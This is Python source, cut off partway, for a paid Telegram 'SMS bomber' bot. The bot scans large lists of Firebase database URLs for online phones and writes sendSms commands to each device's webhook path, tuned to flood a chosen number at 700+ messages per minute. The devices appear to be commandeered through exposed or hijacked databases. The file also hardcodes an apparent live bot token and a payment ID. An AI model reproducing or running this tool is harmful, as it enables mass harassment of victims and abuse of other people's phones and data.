# 🗿 Bot Developer - @GOD_AYUSH
# 🔰 Developer Channel - @Ayush_Hackz
# ⚡ AYUSH SMS BOMBER v8.0 — PRO MAX EDITION
# 🚀 High-Performance | Multi-Worker | MongoDB-Ready | 700+ SMS/min

import warnings
warnings.filterwarnings("ignore", category=ResourceWarning)
import asyncio, json, os, time, logging, random, string, threading, sys, hashlib
from datetime import datetime, timedelta
from copy import deepcopy
from collections import defaultdict, deque
from urllib.parse import quote
from typing import Optional, List, Dict, Any
from dataclasses import dataclass, field

import aiohttp
from aiohttp import web, TCPConnector
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton,
    ChatMemberUpdated,
    FSInputFile,
    InputMediaPhoto, InputMediaVideo, InputMediaAudio, InputMediaDocument
)
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
    datefmt="%H:%M:%S"
)
log = logging.getLogger("AyushBlastPro")

# ═══════════════════════════════════════════════════════════════
# ║  PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════════
EMOJI_FIRE = "5289722755871162900"
EMOJI_STAR = "5372849966689566579"
EMOJI_ROCKET = "5359664288241829619"
EMOJI_CROWN = "6237927637906364256"
EMOJI_SHIELD = "6235476345451716705"
EMOJI_MONEY = "6244678063775289843"
EMOJI_PHONE = "6239930832128056797"
EMOJI_CHECK = "4958689671950369798"
EMOJI_CROSS = "4958900559139570572"
EMOJI_WARNING = "4958526153955476488"
EMOJI_LOCK = "4956719506027185156"
EMOJI_GIFT = "5084613633418199991"
EMOJI_BELL = "5098265504796115765"
EMOJI_GEAR = "5116414868357907335"
EMOJI_VIDEO = "5372849966689566579"
EMOJI_TOP = "6237927637906364256"

FIRE_EFFECT_ID = "5104841245755180586"

SMALL_CAPS_MAP = str.maketrans(
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
    "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢ0123456789"
)

def sc(text: str) -> str:
    return text.translate(SMALL_CAPS_MAP)

def em(emoji_id: str, fallback: str = "⭐") -> str:
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

def btn(text: str, callback_data: str, emoji_id: str = None, fallback_emoji: str = "", style: str = None) -> InlineKeyboardButton:
    """Premium button with custom emoji + style color"""
    # AYUSH replace SHURU in some places
    display_text = text
    if sc(text).lower() == "sᴛᴀʀᴛ" or text.lower() == "start":
        display_text = "AYUSH"
    
    label = f"{fallback_emoji} {sc(display_text)}".strip() if (fallback_emoji and not emoji_id) else sc(display_text)
    
    button = InlineKeyboardButton(text=label, callback_data=callback_data)
    if emoji_id:
        try:
            button.icon_custom_emoji_id = emoji_id
        except Exception:
            pass
    if style:
        try:
            setattr(button, "style", style)
        except Exception:
            pass
    return button

def btn_url(text: str, url: str, emoji_id: str = None, fallback_emoji: str = "") -> InlineKeyboardButton:
    display_text = text
    if sc(text).lower() == "sᴛᴀʀᴛ" or text.lower() == "start":
        display_text = "AYUSH"
    label = f"{fallback_emoji} {sc(display_text)}".strip() if (fallback_emoji and not emoji_id) else sc(display_text)
    if emoji_id:
        return InlineKeyboardButton(text=label, url=url, icon_custom_emoji_id=emoji_id)
    return InlineKeyboardButton(text=label, url=url)

def style_btn(text: str, style: str = "primary", request_contact: bool = False, request_location: bool = False) -> KeyboardButton:
    kb_btn = KeyboardButton(text=text, request_contact=request_contact, request_location=request_location)
    if style in ["primary", "success", "danger"]:
        try:
            setattr(kb_btn, "style", style)
        except Exception:
            pass
    return kb_btn

def default_reply_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        keyboard=[
            [style_btn("AYUSH", style="success"), style_btn("📹 Videos", style="primary")],
            [style_btn("💰 Credits", style="primary"), style_btn("🛑 Stop Blast", style="danger")]
        ],
        resize_keyboard=True
    )

# ═══════════════════════════════════════════════════════════════
# ║  CONFIG — EDIT THESE
# ═══════════════════════════════════════════════════════════════
MAIN_OWNER = 7758917200
SUPER_ADMIN_NAME = "@GOD_AYUSH"
SUPER_ADMIN_LINK = "https://t.me/GOD_AYUSH"
SUPER_ADMINS = [7758917200]

BOT_TOKEN = "9161478208:AAGIM1FrKH6-SNN_I0GV3U_OIWsw-04-To8"
LOG_CHANNEL_ID = -1003986900080

_DATA_FILE = "blast_data.json"
_BACKUP_FIREBASE_FILE = "firebase.txt"   # auto-loaded backup
_VERSION = "v7.0-PRO-MAX"

# Performance tuning
_SEND_DELAY = 0.05           # target 700+ sms/min
_PROGRESS_UPDATE_INTERVAL = 0.8
_BACKGROUND_SCAN_INTERVAL = 45.0
_MAX_CONCURRENT_SENDS = 50
_FIREBASE_TIMEOUT = 8
_HTTP_POOL_LIMIT = 200
_HTTP_POOL_PER_HOST = 40

# Speed presets — TARGET: MIN 700 SMS/MIN for FAST
SPEED_FAST = 0.04            # ~1500/min theoretical, ~700+ practical
SPEED_MEDIUM = 0.15          # ~400/min
SPEED_SLOW = 0.35            # ~170/min
SPEED_DEFAULT = SPEED_FAST

# Webhook config (Render)
WEBAPP_HOST = "0.0.0.0"
WEBAPP_PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_PATH = "/webhook"
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # set on Render: https://yourapp.onrender.com

DEFAULT_UPI_ID = "ayush.sharma798@fam"
DEFAULT_UPI_NAME = "AYUSH SMS BOMBER"

# ═══════════════════════════════════════════════════════════════
# ║  GLOBAL RATE LIMITER (anti-flood)
# ═══════════════════════════════════════════════════════════════
class RateLimiter:
    def __init__(self, max_calls: int = 5, period: float = 2.0):
        self.max_calls = max_calls
        self.period = period
        self.calls: Dict[int, deque] = defaultdict(lambda: deque())

    def is_allowed(self, uid: int) -> bool:
        now = time.time()
        dq = self.calls[uid]
        while dq and dq[0] < now - self.period:
            dq.popleft()
        if len(dq) >= self.max_calls:
            return False
        dq.append(now)
        return True

GLOBAL_LIMITER = RateLimiter(max_calls=8, period=2.0)
BLAST_LIMITER = RateLimiter(max_calls=1, period=5.0)

# ═══════════════════════════════════════════════════════════════
# ║  HTTP SESSION POOL (shared, connection reuse)
# ═══════════════════════════════════════════════════════════════
_HTTP_SESSION: Optional[aiohttp.ClientSession] = None

async def get_http_session() -> aiohttp.ClientSession:
    global _HTTP_SESSION
    if _HTTP_SESSION is None or _HTTP_SESSION.closed:
        connector = TCPConnector(
            limit=_HTTP_POOL_LIMIT,
            limit_per_host=_HTTP_POOL_PER_HOST,
            ttl_dns_cache=300,
            enable_cleanup_closed=True,
            force_close=False
        )
        _HTTP_SESSION = aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=_FIREBASE_TIMEOUT)
        )
    return _HTTP_SESSION

# ═══════════════════════════════════════════════════════════════
# ║  DATA LAYER — JSON with atomic write + lock
# ═══════════════════════════════════════════════════════════════
_DATA_LOCK = asyncio.Lock()
_LAST_SAVE = 0.0
_SAVE_BATCH_DELAY = 2.0

def _default_data() -> dict:
    return {
        "owners": [MAIN_OWNER],
        "admins": [],
        "banned": [],
        "free_mode": False,
        "approved": [],
        "firebases": [],                # bot-added
        "backup_firebases": [],         # firebase.txt
        "users": {},
        "stats": {"total_sent": 0, "total_failed": 0, "api_usage": {}},
        "premium": {"ref_credits": 0},
        "force_join": {"enabled": False, "channels": []},
        "pricing": {"plans": [], "upi_id": DEFAULT_UPI_ID, "upi_name": DEFAULT_UPI_NAME},
        "redeem_codes": {},
        "settings": {
            "ref_credits": 0,
            "welcome_credits": 0,
            "max_owners": 6
        },
        "sms_history": {},
        "activity_log": [],
        "protected_numbers": {},
        "videos": [],
        "top_video": None,              # single selected top video + caption
        "buy_requests": {},
        "admin_notes": {}
    }

def load() -> dict:
    if os.path.exists(_DATA_FILE):
        try:
            with open(_DATA_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            default = _default_data()
            for k, v in default.items():
                if k not in data:
                    data[k] = v
            if "pricing" in data:
                data["pricing"].setdefault("upi_id", DEFAULT_UPI_ID)
                data["pricing"].setdefault("upi_name", DEFAULT_UPI_NAME)
            if MAIN_OWNER not in data.get("owners", []):
                data["owners"].insert(0, MAIN_OWNER)
            for uid_str, u in data.get("users", {}).items():
                u.setdefault("credits", 0)
                u.setdefault("sms_history", [])
                u.setdefault("welcome_claimed", False)
            data.setdefault("buy_requests", {})
            data.setdefault("backup_firebases", [])
            data.setdefault("top_video", None)
            data.setdefault("admin_notes", {})
            data.setdefault("settings", {})
            data["settings"].setdefault("welcome_credits", 0)
            data["settings"].setdefault("ref_credits", 0)
            return data
        except Exception as e:
            log.error(f"Load error: {e}")
    d = _default_data()
    save(d)
    return d

def save(d: dict):
    """Atomic write with temp file"""
    try:
        tmp = _DATA_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(d, f, indent=2, ensure_ascii=False)
        os.replace(tmp, _DATA_FILE)
    except Exception as e:
        log.error(f"Save error: {e}")

def load_backup_firebases() -> list:
    """Load firebase URLs from firebase.txt (100k+ lines supported)"""
    result = []
    if not os.path.exists(_BACKUP_FIREBASE_FILE):
        return result
    try:
        with open(_BACKUP_FIREBASE_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if "|" in line:
                    parts = line.split("|", 1)
                    label = parts[0].strip()
                    url = parts[1].strip()
                else:
                    url = line
                    label = url.replace("https://", "").replace("http://", "").split(".")[0][:24]
                if not (url.startswith("http://") or url.startswith("https://")):
                    continue
                url = url.rstrip("/")
                fb_id = "BP" + hashlib.md5(url.encode()).hexdigest()[:10]
                result.append({
                    "id": fb_id,
                    "url": url,
                    "label": label,
                    "added_at": int(time.time()),
                    "source": "backup_file"
                })
    except Exception as e:
        log.error(f"firebase.txt load error: {e}")
    return result

def get_all_firebases(d: dict) -> list:
    """Merge bot-added + backup, dedupe by URL. Bot-added takes priority."""
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    
    seen = {}
    merged = []
    # Bot-added first (priority)
    for fb in bot_fbs:
        u = fb["url"].rstrip("/")
        if u not in seen:
            seen[u] = True
            merged.append(fb)
    # Backup second
    for fb in backup_fbs:
        u = fb["url"].rstrip("/")
        if u not in seen:
            seen[u] = True
            merged.append(fb)
    return merged

# ═══════════════════════════════════════════════════════════════
# ║  USER / ROLE HELPERS
# ═══════════════════════════════════════════════════════════════
def reg_user(uid: int, name: str, d: dict) -> bool:
    k = str(uid)
    if k not in d["users"]:
        d["users"][k] = {
            "name": name, "uses": 0, "credits": 0,
            "joined_at": int(time.time()),
            "refer_code": None, "referred_by": None,
            "sms_history": [],
            "welcome_claimed": False
        }
        return True
    return False

def log_activity(d: dict, action: str, uid: int, details: str = ""):
    d.setdefault("activity_log", []).append({
        "timestamp": int(time.time()), "uid": uid, "action": action, "details": details
    })
    if len(d["activity_log"]) > 1500:
        d["activity_log"] = d["activity_log"][-1500:]

def is_main_owner(uid: int) -> bool:
    return uid == MAIN_OWNER

def is_owner(uid: int, d: dict) -> bool:
    return uid in d.get("owners", [MAIN_OWNER]) or uid in SUPER_ADMINS

def is_admin(uid: int, d: dict) -> bool:
    return is_owner(uid, d) or uid in d.get("admins", [])

def is_banned(uid: int, d: dict) -> bool:
    return uid in d.get("banned", [])

def can_use(uid: int, d: dict) -> bool:
    if is_banned(uid, d):
        return False
    if is_admin(uid, d):
        return True
    if d.get("free_mode"):
        return True
    if uid in d.get("approved", []):
        return True
    return False

def role_tag(uid: int, d: dict) -> str:
    if is_main_owner(uid): return f"{em(EMOJI_CROWN, '👑')} ᴍᴀɪɴ ᴏᴡɴᴇʀ"
    if is_owner(uid, d): return f"{em(EMOJI_CROWN, '🔱')} ᴏᴡɴᴇʀ"
    if uid in d.get("admins", []): return f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴ"
    if uid in d.get("approved", []): return f"{em(EMOJI_CHECK, '✅')} ᴀᴘᴘʀᴏᴠᴇᴅ"
    if d.get("free_mode"): return f"{em(EMOJI_GIFT, '🆓')} ғʀᴇᴇ ᴜsᴇʀ"
    return f"{em(EMOJI_CROSS, '❌')} ɴᴏ ᴀᴄᴄᴇss"

def get_user_credits(uid: int, d: dict) -> int:
    return d.get("users", {}).get(str(uid), {}).get("credits", 0)

def add_credits(uid: int, amount: int, d: dict):
    k = str(uid)
    if k not in d.get("users", {}):
        d["users"][k] = {"credits": 0}
    d["users"][k]["credits"] = d["users"][k].get("credits", 0) + amount

def deduct_credits(uid: int, amount: int, d: dict) -> bool:
    k = str(uid)
    if k in d.get("users", {}):
        current = d["users"][k].get("credits", 0)
        if current >= amount:
            d["users"][k]["credits"] = current - amount
            return True
    return False

def generate_user_refer_code(uid: int, d: dict) -> str:
    k = str(uid)
    if k in d.get("users", {}) and d["users"][k].get("refer_code"):
        return d["users"][k]["refer_code"]
    while True:
        code = "REF" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        exists = any(u.get("refer_code") == code for u in d.get("users", {}).values())
        if not exists:
            break
    if k in d.get("users", {}):
        d["users"][k]["refer_code"] = code
    return code

def process_referral(new_uid: int, code: str, d: dict) -> tuple:
    referrer_uid = None
    for uid_str, udata in d.get("users", {}).items():
        if udata.get("refer_code") == code:
            referrer_uid = int(uid_str)
            break
    if not referrer_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ɪɴᴠᴀʟɪᴅ ʀᴇғᴇʀʀᴀʟ ᴄᴏᴅᴇ!", None
    if referrer_uid == new_uid:
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴘɴᴀ ᴄᴏᴅᴇ ᴋʜᴜᴅ ᴜsᴇ ɴᴀʜɪɴ ᴋᴀʀ sᴀᴋᴛᴇ!", None
    if d["users"].get(str(new_uid), {}).get("referred_by"):
        return False, f"{em(EMOJI_CROSS, '❌')} ᴀᴀᴘ ᴘᴇʜʟᴇ sᴇ ʀᴇғᴇʀ ʜᴏ ᴄʜᴜᴋᴇ ʜᴀɪɴ!", None
    ref_credits = d.get("settings", {}).get("ref_credits", 0)
    if ref_credits > 0:
        add_credits(new_uid, ref_credits, d)
        add_credits(referrer_uid, ref_credits, d)
    d["users"][str(new_uid)]["referred_by"] = referrer_uid
    save(d)
    if ref_credits <= 0:
        return True, f"{em(EMOJI_GIFT, '🎉')} ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋᴇᴅ! (ᴄʀᴇᴅɪᴛs ᴏғғ)", referrer_uid
    return True, f"{em(EMOJI_GIFT, '🎉')} ᴡᴇʟᴄᴏᴍᴇ! ᴀᴀᴘᴋᴏ {ref_credits} ᴄʀᴇᴅɪᴛs ᴍɪʟᴇ ʜᴀɪɴ!", referrer_uid

# ═══════════════════════════════════════════════════════════════
# ║  FIREBASE API LAYER (with failover & load balancing)
# ═══════════════════════════════════════════════════════════════
CACHED_DEVICES: List[dict] = []
FB_HEALTH: Dict[str, dict] = {}   # fb_id -> {latency, success, fail, score}
LAST_SCAN_TIME = 0.0
SCANNING_IN_PROGRESS = False
SCAN_STATUS = f"{em(EMOJI_WARNING, '⏳')} ɴᴏᴛ sᴛᴀʀᴛᴇᴅ"
SCAN_LOCK = asyncio.Lock()
FB_DEVICE_COUNTS: Dict[str, dict] = {}

def _update_fb_health(fb_id: str, ok: bool, latency: float):
    h = FB_HEALTH.setdefault(fb_id, {"sent": 0, "fail": 0, "latency": 0.0, "last": 0})
    if ok:
        h["sent"] += 1
    else:
        h["fail"] += 1
    h["latency"] = (h["latency"] * 0.7) + (latency * 0.3)  # EMA
    h["last"] = time.time()

def _fb_score(fb_id: str) -> float:
    """Lower = better. Used for load balancing."""
    h = FB_HEALTH.get(fb_id)
    if not h:
        return 0.5
    total = h["sent"] + h["fail"]
    if total == 0:
        return 0.5
    fail_rate = h["fail"] / total
    return fail_rate * 10 + h["latency"]

async def fb_get(base_url: str, path: str, timeout: int = _FIREBASE_TIMEOUT) -> dict:
    url = base_url.rstrip("/") + path
    t0 = time.time()
    try:
        session = await get_http_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                txt = (await r.text()).strip()
                _update_fb_health(base_url, True, time.time() - t0)
                if txt == "null" or not txt:
                    return {}
                return json.loads(txt)
    except Exception as e:
        _update_fb_health(base_url, False, time.time() - t0)
        log.debug(f"fb_get {url[:60]}: {e}")
    return {}

async def fb_put(base_url: str, path: str, payload: dict, retries: int = 2) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(retries):
        t0 = time.time()
        try:
            session = await get_http_session()
            async with session.put(
                url, json=payload, timeout=aiohttp.ClientTimeout(total=6)
            ) as r:
                ok = 200 <= r.status < 300
                _update_fb_health(base_url, ok, time.time() - t0)
                if ok:
                    return True
        except Exception as e:
            _update_fb_health(base_url, False, time.time() - t0)
            log.debug(f"fb_put attempt {attempt+1} {url[:60]}: {e}")
        await asyncio.sleep(0.15 * (attempt + 1))
    return False

def device_is_online(device_data: dict) -> bool:
    return any([
        device_data.get("isOnline"),
        device_data.get("online"),
        device_data.get("connected"),
        device_data.get("status") in ("online", "active", True, 1)
    ])

async def _fetch_one_device(session: aiohttp.ClientSession, fb: dict, dev_id: str, sem: asyncio.Semaphore) -> Optional[dict]:
    async with sem:
        try:
            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=6)) as r:
                if r.status != 200:
                    return None
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    return None
                dev_data = json.loads(txt)
                if isinstance(dev_data, dict) and device_is_online(dev_data):
                    name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                    sims = dev_data.get("sims", [])
                    return {
                        "fb_id": fb["id"],
                        "fb_url": fb["url"],
                        "fb_label": fb.get("label", fb["url"][:30]),
                        "dev_id": dev_id,
                        "dev_name": name,
                        "sims": sims,
                    }
        except Exception:
            pass
    return None

async def get_all_online_devices(d: dict) -> list:
    """Scan ALL firebases in parallel with per-device batching. Handles 100k+ lines."""
    fbs = get_all_firebases(d)
    if not fbs:
        return []
    
    results = []
    session = await get_http_session()
    device_sem = asyncio.Semaphore(80)  # concurrent device fetches
    
    async def fetch_one_fb(fb: dict):
        try:
            shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            async with session.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                if r.status != 200:
                    return
                txt = (await r.text()).strip()
                if txt == "null" or not txt:
                    return
                device_ids = json.loads(txt)
                if not isinstance(device_ids, dict):
                    return
                
                dev_ids = list(device_ids.keys())
                # Batch in chunks of 40 to avoid memory spikes
                for i in range(0, len(dev_ids), 40):
                    batch = dev_ids[i:i+40]
                    tasks = [_fetch_one_device(session, fb, did, device_sem) for did in batch]
                    batch_res = await asyncio.gather(*tasks, return_exceptions=True)
                    for res in batch_res:
                        if res and not isinstance(res, Exception):
                            results.append(res)
        except Exception as e:
            log.debug(f"fb scan {fb['url'][:60]}: {e}")
    
    # Run all firebases concurrently, but cap at 100 parallel to avoid overload
    fb_sem = asyncio.Semaphore(100)
    async def guarded(fb):
        async with fb_sem:
            await fetch_one_fb(fb)
    
    await asyncio.gather(*(guarded(fb) for fb in fbs), return_exceptions=True)
    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

# ═══════════════════════════════════════════════════════════════
# ║  BACKGROUND SCANNER
# ═══════════════════════════════════════════════════════════════
async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS
    log.info("✅ Background Firebase Scanner STARTED (45s interval)")
    first_scan_done = False
    
    while True:
        try:
            async with SCAN_LOCK:
                if SCANNING_IN_PROGRESS:
                    await asyncio.sleep(3)
                    continue
                SCANNING_IN_PROGRESS = True
            
            SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
            t_start = time.time()
            
            d = load()
            # Load backup firebase.txt if exists & changed
            try:
                file_mtime = os.path.getmtime(_BACKUP_FIREBASE_FILE) if os.path.exists(_BACKUP_FIREBASE_FILE) else 0
                last_loaded = d.get("_backup_mtime", 0)
                if file_mtime > last_loaded:
                    backup = load_backup_firebases()
                    if backup:
                        d["backup_firebases"] = backup
                        d["_backup_mtime"] = file_mtime
                        save(d)
                        log.info(f"📁 Loaded {len(backup)} firebases from firebase.txt")
            except Exception as e:
                log.warning(f"backup load: {e}")
            
            fbs = get_all_firebases(d)
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ"
                CACHED_DEVICES = []
                async with SCAN_LOCK:
                    SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue
            
            devices = await get_all_online_devices(d)
            CACHED_DEVICES = devices
            
            # Per-fb counts
            new_counts = {}
            for fb in fbs:
                fb_id = fb["id"]
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                new_counts[fb_id] = {
                    "label": fb.get("label", fb["url"][:30]),
                    "online": fb_online,
                    "last_update": int(time.time())
                }
            FB_DEVICE_COUNTS.clear()
            FB_DEVICE_COUNTS.update(new_counts)
            LAST_SCAN_TIME = time.time()
            
            dur = time.time() - t_start
            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs | {dur:.1f}s"
                log.info(f"[SCAN] {len(devices)} devices | {len(fbs)} DBs | {dur:.1f}s")
                if not first_scan_done:
                    try:
                        await bot.send_message(
                            MAIN_OWNER,
                            f"{em(EMOJI_ROCKET, '🚀')} <b>Scanner Active!</b>\n\n"
                            f"{em(EMOJI_PHONE, '📱')} Devices: <b>{len(devices)}</b>\n"
                            f"{em(EMOJI_FIRE, '🔥')} DBs: <b>{len(fbs)}</b>\n"
                            f"{em(EMOJI_GEAR, '🔄')} Interval: 45s",
                            parse_mode="HTML"
                        )
                    except: pass
                    first_scan_done = True
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs | {dur:.1f}s"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:25]}"
            log.error(f"[SCAN] {e}")
        finally:
            async with SCAN_LOCK:
                SCANNING_IN_PROGRESS = False
            await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)

def get_cached_devices() -> list:
    return CACHED_DEVICES

def get_scan_status() -> str:
    if SCANNING_IN_PROGRESS:
        return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES:
        return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    n = len(CACHED_DEVICES)
    diff = time.time() - LAST_SCAN_TIME
    if diff < 60:
        return f"{em(EMOJI_CHECK, '🟢')} {n} ᴅᴇᴠɪᴄᴇs"
    elif diff < 300:
        return f"{em(EMOJI_WARNING, '🟡')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ)"
    return f"{em(EMOJI_CROSS, '🔴')} {n} ᴅᴇᴠɪᴄᴇs ({int(diff/60)}ᴍ)"

# ═══════════════════════════════════════════════════════════════
# ║  FORCE JOIN
# ═══════════════════════════════════════════════════════════════
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception:
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d):
        return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [f"{em(EMOJI_CROSS, '⛔')} <b>Join karein pehle!</b>\n"]
    for ch in missing:
        lines.append(f"• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n<i>Join ke baad /start karein.</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# ═══════════════════════════════════════════════════════════════
# ║  UTIL / FMT
# ═══════════════════════════════════════════════════════════════
def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def mask_number(number: str) -> str:
    if len(number) <= 4:
        return number
    return number[:2] + "******" + number[-4:]

def progress_bar(current: int, total: int, width: int = 20) -> str:
    if total <= 0:
        return "░" * width
    filled = min(width, int(width * current / total))
    return "█" * filled + "░" * (width - filled)

def progress_text(sent: int, failed: int, total: int, credits: int = None, speed_label: str = "⚡ FAST") -> str:
    bar = progress_bar(sent + failed, total)
    percent = int(((sent + failed) / total) * 100) if total > 0 else 0
    rate = ""
    lines = [
        f"{em(EMOJI_WARNING, '⏳')} <b>{sc('sending sms...')}</b>\n",
        f"{bar} <b>{percent}%</b>\n",
        f"{em(EMOJI_CHECK, '✅')} sᴇɴᴛ: <b>{sent}</b>",
        f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ: <b>{failed}</b>",
        f"{em(EMOJI_STAR, '📊')} ᴘʀᴏɢʀᴇss: <b>{sent + failed}</b> / <b>{total}</b>",
        f"{em(EMOJI_ROCKET, '⚡')} sᴘᴇᴇᴅ: <b>{speed_label}</b>\n",
    ]
    if credits is not None:
        lines.append(f"{em(EMOJI_MONEY, '💳')} ᴄʀᴇᴅɪᴛs: <b>{credits}</b>")
    lines.append(f"\n<i>{em(EMOJI_WARNING, '🛑')} sᴛᴏᴘ ᴋᴇ ʟɪʏᴇ ʙᴜᴛᴛᴏɴ ᴅᴀʙᴀʏᴇɪɴ</i>")
    return "\n".join(lines)

def stop_send_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴛᴏᴘ sᴇɴᴅɪɴɢ", "user:stop_send", EMOJI_CROSS, "🛑", style="danger")]
    ])

# ═══════════════════════════════════════════════════════════════
# ║  SESSIONS
# ═══════════════════════════════════════════════════════════════
class UserSession:
    __slots__ = ['uid', 'cancelled', 'sent', 'failed', 'task', 'start_time', 'lock', 'number', 'target_uid', 'rate']
    def __init__(self, uid: int):
        self.uid = uid
        self.cancelled = False
        self.sent = 0
        self.failed = 0
        self.task = None
        self.start_time = time.time()
        self.lock = asyncio.Lock()
        self.number = None
        self.target_uid = None
        self.rate = 0.0

USER_SESSIONS: Dict[int, UserSession] = {}
SESSIONS_LOCK = asyncio.Lock()
PROTECTED_NUMBERS: Dict[str, int] = {}

# ═══════════════════════════════════════════════════════════════
# ║  FSM STATES
# ═══════════════════════════════════════════════════════════════
class S(StatesGroup):
    send_number = State()
    send_message = State()
    send_speed = State()
    send_count = State()
    owner_send_number = State()
    owner_send_message = State()
    owner_send_speed = State()
    owner_send_count = State()
    admin_send_number = State()
    admin_send_message = State()
    admin_send_speed = State()
    admin_send_count = State()
    redeem_code = State()
    add_firebase = State()
    add_firebase_file = State()
    add_owner = State()
    add_admin = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    fj_add_channel = State()
    fj_add_link = State()
    add_plan_name = State()
    add_plan_price = State()
    add_plan_credits = State()
    add_plan_link = State()
    add_credits_uid = State()
    add_credits_amount = State()
    deduct_credits_uid = State()
    deduct_credits_amount = State()
    gen_redeem_credits = State()
    gen_redeem_type = State()
    gen_redeem_uses = State()
    set_ref_credits = State()
    set_welcome_credits = State()
    set_upi_id = State()
    protect_number = State()
    track_number = State()
    transfer_credits_uid = State()
    transfer_credits_amount = State()
    add_all_credits_amount = State()
    deduct_all_credits_amount = State()
    add_video = State()
    add_top_video = State()
    add_top_video_caption = State()
    buy_ss = State()
    admin_note_uid = State()
    admin_note_text = State()

# ═══════════════════════════════════════════════════════════════
# ║  KEYBOARDS
# ═══════════════════════════════════════════════════════════════
def kb(*rows) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=t, callback_data=c) for t, c in row]
        for row in rows
    ])

def speed_kb(prefix: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
